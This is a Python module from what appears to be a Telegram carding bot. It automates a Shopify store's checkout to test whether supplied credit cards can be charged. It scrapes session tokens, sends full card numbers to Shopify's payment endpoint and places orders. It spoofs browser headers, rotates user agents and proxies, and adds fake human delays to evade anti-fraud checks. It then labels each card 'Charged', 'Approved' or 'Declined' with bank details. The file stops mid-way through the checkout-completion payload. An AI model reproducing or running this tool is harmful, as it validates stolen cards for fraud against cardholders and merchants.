# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - CORRECTED with real checkout flow
# Uses meta-app-prod-store-1.myshopify.com

import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
from urllib.parse import urlparse, parse_qs, urlencode
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Import bin details function
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Enhanced Custom logger with detailed console logging
class ConsoleLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        
    def start_check(self, card_details):
        """Start a new check session"""
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc
        
        print("\n" + "="*80)
        print(f"🛒 [SHOPIFY CHARGE PROCESS STARTED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── User ID: {self.user_id or 'N/A'}")
        print(f"   ├── Card: {masked_cc}")
        print(f"   └── Start Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")
    
    def step(self, step_num, step_name, description, status="PROCESSING"):
        """Log a step in the process"""
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        status_emoji = {
            "PROCESSING": "🔄",
            "SUCCESS": "✅",
            "FAILED": "❌",
            "WARNING": "⚠️",
            "INFO": "ℹ️"
        }.get(status, "➡️")
        
        print(f"{status_emoji} STEP {step_num:02d}: {step_name}")
        print(f"   ├── Description: {description}")
        print(f"   ├── Elapsed: {elapsed:.2f}s")
        print(f"   └── Timestamp: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        print()
        
        return elapsed
    
    def sub_step(self, step_num, sub_step, description, details=None):
        """Log a sub-step"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── {step_num}.{sub_step}: {description}")
        if details:
            print(f"   │   │   └── {details}")
    
    def request_details(self, method, url, status_code, response_time, details=None):
        """Log HTTP request details"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── HTTP {method} {url}")
        print(f"   │   │   ├── Status: {status_code}")
        print(f"   │   │   ├── Response Time: {response_time:.2f}s")
        print(f"   │   │   ├── Total Elapsed: {elapsed:.2f}s")
        if details:
            print(f"   │   │   └── Details: {details}")
    
    def extracted_data(self, data_type, data_value):
        """Log extracted data"""
        print(f"   │   ├── Extracted {data_type}: {data_value}")
    
    def error_detail(self, error_message, error_type="ERROR"):
        """Log error details"""
        error_emoji = "❌" if error_type == "ERROR" else "⚠️"
        print(f"{error_emoji} ERROR DETAIL: {error_message}")
    
    def result(self, success, message, final_status, response_time):
        """Log final result"""
        result_emoji = "✅" if success else "❌"
        result_text = "SUCCESS" if success else "FAILED"
        
        print("\n" + "="*80)
        print(f"{result_emoji} [SHOPIFY CHARGE PROCESS COMPLETED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── Result: {result_text}")
        print(f"   ├── Final Status: {final_status}")
        print(f"   ├── Response: {message[:100]}{'...' if len(message) > 100 else ''}")
        print(f"   ├── Total Steps: {self.step_counter}")
        print(f"   ├── Total Time: {response_time:.2f}s")
        print(f"   └── End Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")

# Create global logger instance
logger = ConsoleLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
    """Format response exactly like response.py"""
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    # Extract user_id from profile
    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except Exception:
        user_id = None

    # Load gateway from DATA/sites.json
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
    except Exception:
        gateway = "Shopify Self Site 💷"

    # Clean response
    raw_response = str(raw_response) if raw_response else "-"

    # Determine status - FIXED LOGIC
    raw_upper = raw_response.upper()
    
    # Check for REAL successful charges
    if "ORDER_PLACED" in raw_upper or "THANK YOU" in raw_upper or "SUBMITSUCCESS" in raw_upper:
        status_flag = "Charged 💎"
    # Check for OTP/3D Secure
    elif any(keyword in raw_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", "3DS"
    ]):
        status_flag = "Approved ❎"
    # Check for address/ZIP issues
    elif any(keyword in raw_upper for keyword in [
        "MISMATCHED", "INCORRECT_ZIP", "INCORRECT_ADDRESS", "ADDRESS_VERIFICATION"
    ]):
        status_flag = "Approved ❎"
    # Check for specific approved but declined scenarios
    elif any(keyword in raw_upper for keyword in [
        "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC", 
        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED", "DECLINED"
    ]):
        status_flag = "Declined ❌"
    # Default to declined
    else:
        status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    # User Plan
    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except Exception:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    # Clean name
    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    # Final formatted message
    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>{gateway}</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{raw_response}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
"""
    return result

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        
        # Cookies will be collected from responses
        self.cookies = {}
        self.checkout_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
        
        # Correct addresses from your instructions
        self.shipping_address = {
            "first_name": "Paris",
            "last_name": "Hilton",
            "address1": "8 Log Pond Drive",
            "address2": "Apartment, suite, etc. (optional)",
            "city": "Horsham",
            "province": "PA",
            "zip": "19044",
            "country": "US",
            "phone": "5551234567",
            "email": "brucewayne0002@gmail.com"
        }
        
        self.billing_address = {
            "first_name": self.generate_random_name(),
            "last_name": self.generate_random_name(),
            "address1": "8 Log Pond Drive",
            "city": "Horsham",
            "province": "PA",
            "zip": "19044",
            "country": "US",
            "phone": "5551234567"
        }
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            self.current_proxy = get_proxy_for_user(user_id, "random")
            if self.current_proxy:
                print(f"🔄 PROXY: Using proxy: {self.current_proxy[:50]}...")
        
        # Initialize console logger
        self.console_logger = ConsoleLogger(user_id)
    
    def generate_random_name(self):
        """Generate random first and last name"""
        first_names = ["John", "Michael", "David", "James", "Robert", "William", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        return random.choice(first_names)
    
    def get_base_headers(self):
        """Get base headers for browser-like requests"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Pragma': 'no-cache',
            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }
        
    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_base_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add cookies if we have them
            if self.cookies and 'cookies' not in kwargs:
                kwargs['cookies'] = self.cookies
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            # Update cookies from response
            if 'set-cookie' in response.headers:
                cookies_to_update = response.headers.get_list('set-cookie')
                for cookie in cookies_to_update:
                    # Parse cookie
                    if '=' in cookie:
                        name_value = cookie.split(';')[0]
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            self.cookies[name] = value
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            print(f"❌ Request error for {url}: {str(e)}")
            raise e
            
    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)
        
    async def load_homepage(self, client):
        """Load homepage to get initial cookies"""
        try:
            elapsed = self.console_logger.step(1, "LOAD HOMEPAGE", "Loading homepage for initial cookies")
            
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            self.console_logger.request_details("GET", self.base_url, response.status_code, 
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                self.console_logger.sub_step(1, 1, "Homepage loaded successfully")
                # Store cookies
                self.console_logger.step(1, "LOAD HOMEPAGE", "Homepage loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load homepage: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Homepage error: {str(e)}")
            return False
        
    async def load_product_page(self, client):
        """Load product page to view product"""
        try:
            elapsed = self.console_logger.step(2, "LOAD PRODUCT PAGE", "Loading product page")
            
            response = await self.make_request(
                client, 'GET', self.product_url
            )
            
            self.console_logger.request_details("GET", self.product_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                html_content = response.text
                
                # Extract variant ID from the logs (43207284392098)
                variant_patterns = [
                    r'data-product-id="(\d+)"',
                    r'product_id["\']?\s*:\s*["\']?(\d+)',
                    r'variant_id["\']?\s*:\s*["\']?(\d+)',
                    r'/variants/(\d+)/'
                ]
                
                for pattern in variant_patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        variant_id = match.group(1)
                        self.console_logger.extracted_data("Product Variant ID", variant_id)
                        break
                
                self.console_logger.sub_step(2, 1, "Product page loaded successfully")
                self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load product page: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Product page error: {str(e)}")
            return False
            
    async def add_to_cart(self, client):
        """Add product to cart using the correct variant ID from logs"""
        try:
            elapsed = self.console_logger.step(3, "ADD TO CART", "Adding product to cart")
            
            # From the logs, the correct endpoint is /cart/add with form data
            add_to_cart_url = f"{self.base_url}/cart/add"
            
            # Headers from actual request in logs
            headers = {
                'Accept': 'application/javascript',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
                'Origin': self.base_url,
                'Referer': self.product_url,
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': self.user_agent,
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            # Form data from logs - CORRECT VARIANT ID
            boundary = headers['Content-Type'].split('=')[1]
            
            # Build multipart form data
            form_data = f"""------{boundary}
Content-Disposition: form-data; name="quantity"

1
------{boundary}
Content-Disposition: form-data; name="form_type"

product
------{boundary}
Content-Disposition: form-data; name="utf8"

✓
------{boundary}
Content-Disposition: form-data; name="id"

43207284392098
------{boundary}
Content-Disposition: form-data; name="product-id"

7890988171426
------{boundary}
Content-Disposition: form-data; name="section-id"

template--15468374917282__main
------{boundary}
Content-Disposition: form-data; name="sections"

cart-notification-product,cart-notification-button,cart-icon-bubble
------{boundary}
Content-Disposition: form-data; name="sections_url"

/products/retailer-id-fix-no-mapping
------{boundary}--"""
            
            response = await client.post(
                add_to_cart_url,
                headers=headers,
                content=form_data,
                cookies=self.cookies,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", add_to_cart_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              "Added variant 43207284392098 to cart")
            
            if response.status_code == 200:
                self.console_logger.sub_step(3, 1, "Product added to cart successfully")
                self.console_logger.step(3, "ADD TO CART", "Product added to cart", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to add to cart: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Add to cart error: {str(e)}")
            return False
    
    async def go_to_cart_page(self, client):
        """Go to cart page before checkout"""
        try:
            elapsed = self.console_logger.step(4, "GO TO CART", "Loading cart page")
            
            response = await self.make_request(
                client, 'GET', f"{self.base_url}/cart"
            )
            
            self.console_logger.request_details("GET", f"{self.base_url}/cart", response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                self.console_logger.sub_step(4, 1, "Cart page loaded successfully")
                self.console_logger.step(4, "GO TO CART", "Cart page loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load cart page: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Cart page error: {str(e)}")
            return False
    
    async def go_to_checkout(self, client):
        """Go to checkout page from cart"""
        try:
            elapsed = self.console_logger.step(5, "GO TO CHECKOUT", "Proceeding to checkout")
            
            # From logs: POST /cart with checkout parameter
            checkout_url = f"{self.base_url}/cart"
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/cart",
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': self.user_agent
            }
            
            # Form data from logs
            data = {
                'updates[]': '1',
                'checkout': ''
            }
            
            response = await client.post(
                checkout_url,
                headers=headers,
                data=data,
                cookies=self.cookies,
                timeout=30.0,
                follow_redirects=False  # We need to capture the redirect
            )
            
            self.console_logger.request_details("POST", checkout_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              "Proceeding to checkout")
            
            if response.status_code == 302:
                # Get the redirect location
                location = response.headers.get('location', '')
                if location:
                    # Extract checkout token from URL
                    if '/checkouts/cn/' in location:
                        match = re.search(r'/checkouts/cn/([^/]+)', location)
                        if match:
                            self.checkout_token = match.group(1)
                            self.console_logger.extracted_data("Checkout Token", self.checkout_token)
                    
                    # Complete the checkout URL with skip_shop_pay parameter
                    if '?' in location:
                        location += '&skip_shop_pay=true'
                    else:
                        location += '?skip_shop_pay=true'
                    
                    self.console_logger.sub_step(5, 1, f"Redirected to checkout: {location[:80]}...")
                    self.console_logger.step(5, "GO TO CHECKOUT", "Redirected to checkout page", "SUCCESS")
                    return True, location
                else:
                    self.console_logger.error_detail("No redirect location found")
                    return False, "No redirect location"
            else:
                self.console_logger.error_detail(f"Failed to proceed to checkout: {response.status_code}")
                return False, f"Checkout failed: {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)}"
    
    async def load_checkout_page(self, client, checkout_url):
        """Load the checkout page to get session tokens"""
        try:
            elapsed = self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Loading checkout page for tokens")
            
            response = await self.make_request(
                client, 'GET', checkout_url
            )
            
            self.console_logger.request_details("GET", checkout_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                html_content = response.text
                
                # Extract session token from page
                session_token_patterns = [
                    r'"sessionToken":"([^"]+)"',
                    r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
                    r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)'
                ]
                
                for pattern in session_token_patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        self.x_checkout_one_session_token = match.group(1)
                        self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:30]}...")
                        break
                
                # If not found, generate one
                if not self.x_checkout_one_session_token:
                    self.x_checkout_one_session_token = self.generate_session_token()
                    self.console_logger.sub_step(6, 1, "Generated session token")
                
                self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Checkout page loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load checkout page: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout page error: {str(e)}")
            return False
    
    async def submit_email(self, client):
        """Submit email address to checkout"""
        try:
            elapsed = self.console_logger.step(7, "SUBMIT EMAIL", "Submitting email address")
            
            if not self.checkout_token or not self.x_checkout_one_session_token:
                return False, "Missing checkout tokens"
            
            url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
            
            headers = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US',
                'Content-Type': 'application/json',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Shopify-Checkout-Client': 'checkout-web/1.0',
                'Shopify-Checkout-Source': f'id="{self.checkout_token}", type="cn"',
                'User-Agent': self.user_agent,
                'X-Checkout-One-Session-Token': self.x_checkout_one_session_token,
                'X-Checkout-Web-Build-Id': self.x_checkout_web_build_id,
                'X-Checkout-Web-Deploy-Stage': 'production',
                'X-Checkout-Web-Server-Handling': 'fast',
                'X-Checkout-Web-Server-Rendering': 'yes',
                'X-Checkout-Web-Source-Id': self.checkout_token
            }
            
            # Simplified email submission payload
            json_data = {
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "sessionInput": {
                            "sessionToken": self.x_checkout_one_session_token,
                        },
                        "buyerIdentity": {
                            "email": self.shipping_address["email"],
                            "countryCode": "US",
                            "phoneCountryCode": "US"
                        }
                    },
                    "attemptToken": f"{self.checkout_token}-{random.randint(1000, 9999)}"
                },
                "query": "mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) { submitForCompletion(input: $input, attemptToken: $attemptToken) { ... on SubmitSuccess { receipt { id } } ... on SubmitAlreadyAccepted { receipt { id } } ... on SubmitFailed { reason } ... on SubmitRejected { errors { ... on NegotiationError { code localizedMessage } } } ... on Throttled { pollAfter pollUrl queueToken } } }"
            }
            
            response = await client.post(
                url,
                headers=headers,
                json=json_data,
                cookies=self.cookies,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              "Email submitted")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    # Check if email submission was successful
                    if data.get('data', {}).get('submitForCompletion', {}).get('__typename') in ['SubmitSuccess', 'SubmitAlreadyAccepted']:
                        self.console_logger.step(7, "SUBMIT EMAIL", "Email submitted successfully", "SUCCESS")
                        return True, "Email submitted"
                    else:
                        error_msg = data.get('data', {}).get('submitForCompletion', {}).get('reason', 'Email submission failed')
                        self.console_logger.error_detail(f"Email submission failed: {error_msg}")
                        return False, error_msg
                except:
                    self.console_logger.sub_step(7, 1, "Email submission response parsed")
                    return True, "Email submitted"
            else:
                self.console_logger.error_detail(f"Email submission failed: {response.status_code}")
                return False, f"Email submission failed: {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Email submission error: {str(e)}")
            return False, f"Email error: {str(e)[:80]}"
    
    async def create_payment_session(self, client, cc, mes, ano, cvv):
        """Create payment session with Shopify PCI"""
        try:
            elapsed = self.console_logger.step(8, "CREATE PAYMENT SESSION", "Creating payment session with PCI")
            
            # Headers from actual request in logs
            headers = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Storage-Access': 'active',
                'User-Agent': self.user_agent,
                'Shopify-Identification-Signature': self.generate_shopify_signature()
            }
            
            # Card holder name
            card_name = f"{self.billing_address['first_name']} {self.billing_address['last_name']}"
            
            json_data = {
                'credit_card': {
                    'number': cc.replace(' ', ''),
                    'month': int(mes),
                    'year': int(ano),
                    'verification_value': cvv,
                    'name': card_name,
                    'start_month': None,
                    'start_year': None
                },
                'payment_session_scope': 'meta-app-prod-store-1.myshopify.com'
            }
            
            # Use separate client for PCI endpoint
            async with httpx.AsyncClient(timeout=30.0) as pci_client:
                response = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=headers,
                    json=json_data,
                    timeout=30.0
                )
            
            self.console_logger.request_details("POST", 'https://checkout.pci.shopifyinc.com/sessions',
                                              response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              f"Card: {cc[:6]}XXXXXX{cc[-4:]}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    session_id = data.get("id", "")
                    if session_id:
                        self.console_logger.extracted_data("Payment Session ID", f"{session_id[:30]}...")
                        self.console_logger.step(8, "CREATE PAYMENT SESSION", "Payment session created", "SUCCESS")
                        return True, session_id
                    else:
                        self.console_logger.error_detail("No session ID in response")
                        return False, "No payment session ID"
                except:
                    self.console_logger.error_detail("Failed to parse payment session response")
                    return False, "Payment session parse error"
            else:
                error_msg = "Payment session creation failed"
                try:
                    error_data = response.json()
                    if "error" in error_data:
                        error_msg = error_data.get("error", {}).get("message", error_msg)
                except:
                    pass
                
                # Extract specific error messages
                error_text = response.text.lower()
                if "declined" in error_text:
                    error_msg = "Card Declined"
                elif "cvc" in error_text:
                    error_msg = "Invalid CVC"
                elif "expired" in error_text:
                    error_msg = "Expired Card"
                elif "funds" in error_text:
                    error_msg = "Insufficient Funds"
                elif "invalid" in error_text:
                    error_msg = "Invalid Card"
                
                self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
                return False, error_msg
                
        except Exception as e:
            self.console_logger.error_detail(f"Payment session error: {str(e)}")
            return False, f"Payment error: {str(e)[:80]}"
    
    async def complete_checkout(self, client, session_id):
        """Complete the checkout with payment"""
        try:
            elapsed = self.console_logger.step(9, "COMPLETE CHECKOUT", "Completing checkout with payment")
            
            if not self.checkout_token or not self.x_checkout_one_session_token:
                return False, "Missing checkout tokens"
            
            url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
            
            headers = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US',
                'Content-Type': 'application/json',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Shopify-Checkout-Client': 'checkout-web/1.0',
                'Shopify-Checkout-Source': f'id="{self.checkout_token}", type="cn"',
                'User-Agent': self.user_agent,
                'X-Checkout-One-Session-Token': self.x_checkout_one_session_token,
                'X-Checkout-Web-Build-Id': self.x_checkout_web_build_id,
                'X-Checkout-Web-Deploy-Stage': 'production',
                'X-Checkout-Web-Server-Handling': 'fast',
                'X-Checkout-Web-Server-Rendering': 'yes',
                'X-Checkout-Web-Source-Id': self.checkout_token
            }
            
            # Complete checkout payload with PICKUP option (no shipping)
            json_data = {
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "sessionInput": {
                            "sessionToken": self.x_checkout_one_session_token,
                        },
                        "discounts": {
